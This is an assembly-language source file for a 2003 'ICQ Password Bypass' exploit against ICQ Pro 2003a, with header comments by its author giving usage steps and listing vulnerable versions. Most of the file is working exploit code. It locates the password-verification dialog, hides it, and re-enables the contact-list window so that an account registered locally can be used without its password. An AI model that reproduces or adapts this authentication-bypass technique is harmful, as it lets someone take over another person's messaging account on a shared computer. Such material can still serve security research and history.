; 
;         CUT HERE - CUTE HERE - ca1-icq.asm - CUT HERE - CUT HERE      BOF
; -------------------------------------------------------------------------
;
;  07/02/2003 - ca1-icq.asm
;  ICQ Password Bypass exploit.
;  written by Cau Moura Prado (aka ca1)
;  mouraprado@infoguerra.com.br - ICQ 373313
;
;  This exploit allows you to login to ICQ server using any account registered *locally*
;  no matter the 'save password' option is checked or not. High level security is also bypassed.
;  All you have to do is run the exploit and set status property using your mouse when the flower
;  is yellow. If you accidentally set status to offline then you will need to restart ICQ and run
;  the exploit again. Greets to: Alex Demchenko(aka Coban), my cousin Rhenan for testing the exploit
;  on his machine and that tiny Israeli company for starting the whole thing. Oh sure.. hehehe
;  I can't forget...  many kisses to those 3 chicks from my building for being so hot!! ;)
;
;
;        uh-oh!
;         ___
;      __/   \__
;     /  \___/  \        Vulnerable:
;     \__/+ +\__/          ICQ Pro 2003a Build #3800
;     /   ~~~   \
;     \__/   \__/        Not Vulnerable:
;        \___/             ICQ Lite alpha Build 1211
;                          ICQ 2001b and ICQ 2002a
;    tHe Flaw Power        All other versions were not tested.
;                            coded with masm32
; _______________________________________________________________________________exploit born in .br

.386
.model flat, stdcall
option casemap:none
include \masm32\include\user32.inc
include \masm32\include\kernel32.inc
includelib \masm32\lib\user32.lib
includelib \masm32\lib\kernel32.lib
.data
szTextHigh byte 'Password Verification', 0
szTextLow byte 'Login to server', 0
szClassName byte '#32770', 0
.data?
hWndLogin dword ?
.code
_entrypoint:
 invoke FindWindow, addr szClassName, addr szTextHigh
 mov hWndLogin, eax
 .if hWndLogin == 0
   invoke FindWindow, addr szClassName, addr szTextLow
   mov hWndLogin, eax
 .endif
 invoke GetParent, hWndLogin
 invoke EnableWindow, eax, 1      ;Enable ICQ contact
list
 invoke ShowWindow, hWndLogin, 0  ;get rid of Login
screen (don't kill this window)
 invoke ExitProcess, 0            ;uhuu.. cya! i gotta
sleep!
end _entrypoint

; 
;         CUT HERE - CUTE HERE - ca1-icq.asm - CUT HERE - CUT HERE      EOF
; -------------------------------------------------------------------------